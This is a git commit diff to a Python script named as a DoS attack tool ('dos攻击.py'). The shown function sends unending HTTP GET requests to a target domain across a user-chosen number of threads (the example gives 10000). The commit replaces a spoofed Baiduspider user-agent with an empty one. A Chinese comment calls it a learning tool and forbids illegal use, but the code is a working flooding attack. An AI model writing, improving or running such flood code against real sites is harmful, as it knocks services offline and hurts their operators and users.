41a0fdc8f38f73058ae963c526f82de768345b22
okiamironman <103590388+okiamironman@users.noreply.github.com>
2023-02-25 16:06:14 +0800

    Update dos攻击.py

--- dos攻击.py
+++ dos攻击.py
@@ -2,11 +2,12 @@ import threading,requests,sys
 
 # 本工具只做学习交流使用，请遵守法律法规，严禁使用本工具进行非法破坏
 # 第1个参数为攻击的域名,第2个参数为自定义线程数。eg:xxx.com  10000
+# 自定义UA头
 def dos(url):
     url2='http://'+url
     while True:
         try:
-            response=requests.get(url2,headers={'user-agent':'Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)'})
+            response=requests.get(url2,headers={'user-agent':''})
             # print('状态码:',response.status_code)
         except Exception as e:
             pass
